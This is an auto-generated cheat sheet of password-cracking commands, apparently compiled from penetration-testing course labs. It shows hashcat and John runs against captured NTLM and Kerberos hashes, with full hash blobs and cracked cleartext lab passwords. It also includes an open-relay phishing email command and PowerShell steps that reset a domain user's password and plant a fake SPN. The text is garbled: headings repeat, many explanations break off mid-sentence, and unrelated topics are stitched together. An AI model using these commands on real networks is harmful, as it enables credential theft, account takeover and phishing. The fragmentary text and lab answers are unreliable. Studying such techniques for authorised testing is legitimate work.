# John / Hashcat

% john, hashcat, cracking, cpts

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - john-the-ripper
#cat/CRACKING/PASSWORD #cpts
-j pour afficher le format JtR --format pour forcer celui à utiliser

```
hashid -j 193069ceb0461e1d40d216e32c79c704
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - john-the-ripper-2
#cat/CRACKING/PASSWORD #cpts
```
locate *2john*
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - single-crack-mode
#cat/CRACKING/PASSWORD #cpts
Single crack mode is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory name, and GECOS values (full name

```
john --single passwd
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - wordlist-mode
#cat/CRACKING/PASSWORD #cpts
Wordlist mode is used to crack passwords with a dictionary attack, meaning it attempts all passwords in a supplied wordlist against the password hash. The basic syntax for the command is as follows:

```
john --wordlist= <file>
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - incremental-mode
#cat/CRACKING/PASSWORD #cpts
Incremental mode is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model (Markov chains). It is designed to test all character combinations defined by a spe

```
grep '# Incremental modes' -A 100 /etc/john/john.conf
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - incremental-mode-2
#cat/CRACKING/PASSWORD #cpts
Incremental mode is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model (Markov chains). It is designed to test all character combinations defined by a spe

```
john --incremental <file>
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - hashcat
#cat/CRACKING/PASSWORD #cpts
-m pour afficher le format hashcat

```
hashid -m 193069ceb0461e1d40d216e32c79c704
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - rules
#cat/CRACKING/PASSWORD #cpts
```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - encrypted-files
#cat/CRACKING/PASSWORD #cpts
```
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\ | fonts\ | share\ | core" ;done
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - encrypted-files-2
#cat/CRACKING/PASSWORD #cpts
```
john --wordlist=rockyou.txt protected-docx.hash
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - encrypted-files-3
#cat/CRACKING/PASSWORD #cpts
```
john protected-docx.hash --show
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - encrypted-files-4
#cat/CRACKING/PASSWORD #cpts
```
john --wordlist=rockyou.txt pdf.hash
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - encrypted-files-5
#cat/CRACKING/PASSWORD #cpts
```
john pdf.hash --show
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-linux-creds
#cat/CRACKING/PASSWORD #cpts
[unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c)

```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-nt-hashes
#cat/CRACKING/PASSWORD #cpts
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-dcc2-hashes
#cat/CRACKING/PASSWORD #cpts
```
hashcat -m 2100 'C2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - attacking-sam-system-and-security
#cat/CRACKING/PASSWORD #cpts
Cracking DCC2

```
sudo hashcat -m 2100 'C2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - smb-upload
#cat/CRACKING/PASSWORD #cpts
*Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are con

```
dir \\192.168.49.128\DavWWWRoot
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - authentication
#cat/CRACKING/PASSWORD #cpts
EXPN is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as "all."

```
telnet 10.10.110.20 25
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - authentication-2
#cat/CRACKING/PASSWORD #cpts
We can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command USER followed by the username, and if the server responds OK. This means that the user exi

```
telnet 10.10.110.20 110
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - open-relay
#cat/CRACKING/PASSWORD #cpts
From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server,

```
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking
#cat/CRACKING/PASSWORD #cpts
```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-ntlmv2-hashes
#cat/CRACKING/PASSWORD #cpts
```
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - example
#cat/CRACKING/PASSWORD #cpts
Now that the hash is in proper format, students at last need to crack it using Hashcat, utilizing hashmode 5600; students will find out that the plaintext password of the cracked hash is security#1:

```
hashcat -m 5600 -w 3 -O svc_qualysCapturedHash.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-the-ticket-offline-with-hashcat
#cat/CRACKING/PASSWORD #cpts
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-the-ticket-offline-with-hashcat-2
#cat/CRACKING/PASSWORD #cpts
```
hashcat (v6.1.1) starting...
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-the-ticket-offline-with-hashcat-3
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - modifiying-crack_file-for-hashcat
#cat/CRACKING/PASSWORD #cpts
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-the-hash-with-hashcat
#cat/CRACKING/PASSWORD #cpts
```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-the-hash-with-hashcat-2
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-the-ticket-with-hashcat-rockyoutxt
#cat/CRACKING/PASSWORD #cpts
```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - running-hashcat-checking-the-status-of-the-cracking-job
#cat/CRACKING/PASSWORD #cpts
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - viewing-the-length-of-time-it-took-to-crack
#cat/CRACKING/PASSWORD #cpts
```
Session..........: hashcat
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-the-hash-offline-with-hashcat
#cat/CRACKING/PASSWORD #cpts
Miscellaneous Misconfigurations

```
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - cracking-the-hash-offline-with-hashcat-2
#cat/CRACKING/PASSWORD #cpts
Miscellaneous Misconfigurations

```
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - forced-authentication-attacks
#cat/CRACKING/PASSWORD #cpts
These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user. All saved Hashes are located in Responder's log

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - select-all-data-from-table-users
#cat/CRACKING/PASSWORD #cpts
Attacking SQL Databases

```
(4 rows affected)
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - open-relay-2
#cat/CRACKING/PASSWORD #cpts
Next, we can use any mail client to connect to the mail server and send our email. Attacking Email Services

```
=== Connection closed with remote host.
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-accounts-password-submit-the-cleartext-value
#cat/CRACKING/PASSWORD #cpts
Finally, students need to crack the hash with `Hashcat`, utilizing hashmode 13100; the password is revealed to be `lucky7`:

```
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-accounts-password-submit-the-cleartext-value-2
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$2f520ef267b5dc8b8c0486deac8a1ac6$9d6b54497f2d45ddb9649e77bc26ee02f8a888275d51c1cb1f10b5365728168536bdf82e3f384a99c55cffb0f38901150a8e248966b818d93347c8e203ff31e331ace4100f85e5974977e5598c23b232761f8ac9ad120b2ca98f73893b7bcbf4a5d0c5829be301a31833de37464bec9d06cb8b2957e79a54feaf5ea941cb54beadc03fd2c89b6c33e5b41c98b55742fa0c44f12658998d44b7b93d29568b04cc592e3c5615912d8211d68314e5de9edc02b21421009f287d33853c90a64cc4962ba658c6c9be2c9e68ef7c6fc40a30feb85b652e0f1e95900422fa1a53dafacdaacd6c4c1d890e4945dc312c2846df6f11a2a
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - what-is-this-users-cleartext-password
#cat/CRACKING/PASSWORD #cpts
Students need to crack the hash from the previous question with `Hashcat`, utilizing hashmode `5600` and using the `rockyou.txt.gz` wordlist:

```
hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - what-is-this-users-cleartext-password-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - what-is-this-users-cleartext-password-3
#cat/CRACKING/PASSWORD #cpts
```
hashcat (v6.2.5-275-gc1df53b47) starting
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-this-users-password-hash-and-submit-the-cleartext-password-as-yo
#cat/CRACKING/PASSWORD #cpts
Students need to crack the user's password using `Hashcat` utilizing hashmode 5600, to find the cleartext to be `charlie1`:

```
hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-this-users-password-hash-and-submit-the-cleartext-password-as-yo-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-hash-for-the-previous-account-and-submit-the-cleartext-passw
#cat/CRACKING/PASSWORD #cpts
Then, students need to use `Hashcat` to crack the hash using the "rockyou.txt.gz" passwords wordlist using hashmode `5600`; students will find out that the plaintext password of the cracked hash is `h1backup55`. Alternat

```
hashcat -m 5600 -w 3 -O capturedHash.txt /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-hash-for-the-previous-account-and-submit-the-cleartext-passw-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -m 5600 -w 3 -O capturedHash.txt /usr/share/wordlists/rockyou.txt.gz
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-hash-for-the-previous-account-and-submit-the-cleartext-passw-3
#cat/CRACKING/PASSWORD #cpts
```
hashcat (v6.2.6) starting
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - run-inveigh-and-capture-the-ntlmv2-hash-for-the-svc_qualys-account-cra
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -m 5600 -w 3 -O svc_qualysCapturedHash.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - retrieve-the-tgs-ticket-for-the-sapservice-account-crack-the-ticket-of
#cat/CRACKING/PASSWORD #cpts
Subsequently, students need to save the hash of the `SAPService` account into a text file and use `Hashcat` to crack it, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is

```
hashcat -m 13100 -W 3 -O SAPHash.txt /usr/share/wordlists/rockyou.txt --force
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - retrieve-the-tgs-ticket-for-the-sapservice-account-crack-the-ticket-of-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ $hashcat -m 13100 -w 3 -O SAPHash.txt /usr/share/wordlists/rockyou.txt --force
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - retrieve-the-tgs-ticket-for-the-sapservice-account-crack-the-ticket-of-3
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$c10f3438e08b2ea6d1e594f86f9a3098$061ffe6405f28cf4bf3cd6e1fe62afd134b10328462bd492a2550e6c071366a8f1034f75dfb5c0c5d80ecdbbe762b1d6f2cb280b6755f7ac4cde11ddfb49bbb16ee699a4c1961f40639e6ad2927969205bfba3116bd776a344de16a08d39ab2dab2d896e7b0f6612366107209903ae458843ab68c524df206aa3af095fcbd01783e805536351926405aef89d036377c1945b7cc3769be49589e2b9fb7e7f63b2847fee13e463bc472de19d64660780f6ab7ce6d47134eefabdc3d30855daef98350d4751fbf477bc887334a628ab176eb9358580bb952cf678a0125d94d3a593eecd7105f5b16ad57f702db3e4521775beb258f8982
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-password-for-this-account-and-submit-it-as-your-answer
#cat/CRACKING/PASSWORD #cpts
Thereafter, students need to save the hash into a text file in `Pwnbox`/`PMVPN` and then use `Hashcat` to crack it, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is `Vir

```
sudo hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-password-for-this-account-and-submit-it-as-your-answer-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ sudo hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-password-for-this-account-and-submit-it-as-your-answer-3
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$6f5b30f5aef2cc451ef05f858d22a0c7$528519e555fd635cce1fc3f60edff8249918716226b5f6bc3f7db5239fe865a3607a962027ccb25446d108fe0978e1671cd9e4490c83da4a5b0e7cca4f2638e8e3c6c4e9fcf82a89b68d62618c4ce23e6210a5483d940d8e9924d6af7a6d1173d5c773366e377e95a0efe852fecc41831740f334b1af96efa980cd5dcb06ed4c4d7afce055e2055a16c3c40291f96ccc362cc3664237ffb1fb94160988a69bb07c68984ea94c8f54a76e4de3fb77a8fcc85af4aef0c5bf549865e4e6054bc93f302cef7b4ac8e453a8d68fbb3c3ef147830e0f9b50897ce5e18b6dd0d51f027f4f01affef7f76fc51241143e
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-2
#cat/CRACKING/PASSWORD #cpts
```
shell-session
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-3
#cat/CRACKING/PASSWORD #cpts
When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Ad

```
cd C:\Tools\
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-4
#cat/CRACKING/PASSWORD #cpts
Students then need to create a `PSCredential Object` for the user `wley`:

```
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-5
#cat/CRACKING/PASSWORD #cpts
Students then need to create a `PSCredential Object` for the user `wley`:

```
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-6
#cat/CRACKING/PASSWORD #cpts
Afterward, students need to create a `SecureString` object:

```
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-7
#cat/CRACKING/PASSWORD #cpts
Subsequently, students need to use `Set-DomainUserPassword`:

```
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-8
#cat/CRACKING/PASSWORD #cpts
```
VERBOSE: [Get-PrincipalContext] Using alternate credentials
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-9
#cat/CRACKING/PASSWORD #cpts
Students need to create a `PSCredential Object` for the user `damundsen`:

```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-10
#cat/CRACKING/PASSWORD #cpts
Students need to create a `PSCredential Object` for the user `damundsen`:

```
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-11
#cat/CRACKING/PASSWORD #cpts
Then, students need to add `damundsen` to the "Help Desk Level 1" group:

```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-12
#cat/CRACKING/PASSWORD #cpts
Students need to confirm that `damundsen` was added to the group successfully:

```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | Select-String -Pattern "damundsen"
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-13
#cat/CRACKING/PASSWORD #cpts
```
@{MemberName=damundsen}
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-14
#cat/CRACKING/PASSWORD #cpts
Now, students need to create a fake SPN for the `adunn` account:

```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-15
#cat/CRACKING/PASSWORD #cpts
```
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-16
#cat/CRACKING/PASSWORD #cpts
Students now need to save the hash into a file in `Pwnbox`/`PMVPN` and then crack it using `Hashcat`, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is `SyncMaster757`:

```
hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-17
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - work-through-the-examples-in-this-section-to-gain-a-better-understandi-18
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$d4cac857ed8f6b9bd4df91e0dca95ab1$b5b1908355b367e199b8cc4d6e34f6c83c7c49318da7f3f8ec5342d025081c8a4b25b07c898f4a787a9b27342fbe0adac91dcba6850e17452f5b6fd7599ce32ad5da3f1c93a3b7dbb37d45941c3682a6bf301cc503d95063580b73eea3c2dc11130c0da7d9b4f3908b5d5ee3609b1c2cfd3050ec225f8774d86f92676a8209a875f3f7ae9c991628741fc93a727a2c4684181038a586328df02e7f68c67e8cee4e948a6fb57c3ab7419a24811e7e95bc1801ba5f70bb0a6464f6a9b9c9351d7a3c4259074b35e4fb82797957f34a314c3e6d0de4c96a0bb52e8678686460742b10b8a1a25d0e2953b4712253ced0d13dab9afd8aba
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - find-another-user-with-the-do-not-require-kerberos-pre-authentication-
#cat/CRACKING/PASSWORD #cpts
Then, students need to save the hash into a file in `Pwnbox`/`PMVPN` and then use `Hashcat` to crack it, utilizing hash-mode 18200; students will find out that the plaintext password of the cracked hash is `Pass@word`:

```
hashcat -m 18200 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - find-another-user-with-the-do-not-require-kerberos-pre-authentication--2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat -m 18200 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - find-another-user-with-the-do-not-require-kerberos-pre-authentication--3
#cat/CRACKING/PASSWORD #cpts
```
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:e3b8fcab0e3905d4678b190116218dca$f297b10a7c0e3ff100fb35e758fe164de662539937c77f197dfda15884f4095db9e5bb7afe3c8f2d49d72ec53bccf0b48d02bb7a51a99142be23372910f99be6ecf2c6227ed0e31a9ad4db28b395cf8ea90dd1b3f87324227872af5dcb2e4cd5527b006dda4a2434877094505494b286260ccb3da4e085e6f7c57fb07ec223922da0591db76b4ed30badfb39cbf7b1f1eba5267b633fad71ba2cdf252bba41ea7b602fca3d860fdfea639695f7a4f09b79ea08d225f37db67f857180b096e0e00dfd240fe8d01e67e40c8dd2e05ded3e164c84def8134188e7597f86d9ea1e9cc48fda29c2f0853453904ef8a7a7d940b2d8201da101fe50b2cc:Pass@word
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - perform-a-cross-forest-kerberoast-attack-and-obtain-the-tgs-for-the-ms
#cat/CRACKING/PASSWORD #cpts
```
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@freightlogistics.local*$e8af5ddf8dbdd8279a238646a42456e9$7070f10702296df7f2dc6db020a655e97beb4814ea6bf4bc0f498f3673703fb6cf8f675b21defb7b41a35909ff357a093cb58598cafefc29c53c4b84d1206e98d11a46cdab3969a0ef63f2ab98ebb893495d8d9651c7f8d6b63fa6b572453870a40d8627c4ec3d63ff79c3f892d763d9a2eb0f8ba6b9c36edb0360c035442fdf3b64760474c49f0d35ec0b6056695618bb53121a3829549efcc87d49a2d168500e9978da431c2ede1a2581a549d828a55e5b007ad526ac25c80f5950c9b3d7eab1ef8a95b805e172b0073ff9a7ac34e274c11e032639e1c690ce948471fafaa26e241cf414a68b
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-tgs-and-submit-the-cleartext-password-as-your-answer
#cat/CRACKING/PASSWORD #cpts
Students need to then save the hash into a file in `Pwnbox`/`PMVPN` to subsequently crack it using `Hashcat`, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is `pabloPICA

```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-tgs-and-submit-the-cleartext-password-as-your-answer-2
#cat/CRACKING/PASSWORD #cpts
```
└──╼ [★]$ hashcat hash.txt -m 13100 -w 3 -O /usr/share/wordlists/rockyou.txt
```

## John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - John / Hashcat - crack-the-tgs-and-submit-the-cleartext-password-as-your-answer-3
#cat/CRACKING/PASSWORD #cpts
```
